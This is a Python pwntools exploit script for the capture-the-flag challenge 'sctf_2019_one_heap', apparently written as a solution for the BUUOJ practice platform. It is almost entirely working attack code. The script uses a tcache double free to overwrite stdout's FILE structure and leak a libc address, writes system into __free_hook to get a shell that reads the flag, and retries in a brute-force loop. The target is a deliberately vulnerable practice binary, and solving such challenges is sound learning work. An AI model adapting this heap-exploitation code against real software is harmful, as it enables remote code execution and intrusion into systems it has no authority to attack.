#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/18 03:41:05
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
# context.log_level = 'debug'
context.arch = 'amd64'
times = 1
if debug:
    # sh = process(['./npuctf_2020_level2'],env={'LD_PRELOAD':'/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so'})
    sh = process("./sctf_2019_one_heap")
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = 'node4.buuoj.cn'
    port = 29685
    sh = remote(IP,port)
    libc = ELF('../../libc/libc-2.27.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('sctf_2019_one_heap')
def debug():
    gdb.attach(sh)
    pause()
def add(size,content):
    sh.recvuntil("Your choice:")
    sh.sendline("1")
    sh.recvuntil("Input the size:")
    sh.sendline(str(size))
    sh.recvuntil("Input the content:")
    sh.sendline(content)

def dele():
    sh.recvuntil("Your choice:")
    sh.sendline("2")

def pwn():
    add(0x7f,"aaaa")
    dele()
    dele()
    add(0x7f,"\x10\x70")
    add(0x7f,"\x00")
    payload = p8(0)*0x23+p8(7)
    add(0x7f,payload)
    dele()
    add(0x40,"")
    add(0x18,p64(0)+'\x60\x87')
    add(0x40,p64(0xfbad1887)+p64(0)*3+p8(0x58))
    leak_addr = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00"),timeout=1)
    libc_base = leak_addr - libc.symbols['_IO_file_jumps']
    log.info("linc_base=>{}".format(hex(libc_base)))
    system_addr = libc_base + libc.symbols['system']
    free_hook = libc_base + libc.symbols['__free_hook']
    add(0x18,p64(0) + p64(free_hook-8))
    add(0x7f,"/bin/sh\x00"+p64(system_addr))
    dele()
    sh.sendline("cat flag")
    sh.interactive()
while True:
    sh = remote('node4.buuoj.cn',29685)
    log.info("times=>{}".format(times))
    times=times+1
    try:
        pwn()
    except:
        sh.close()
    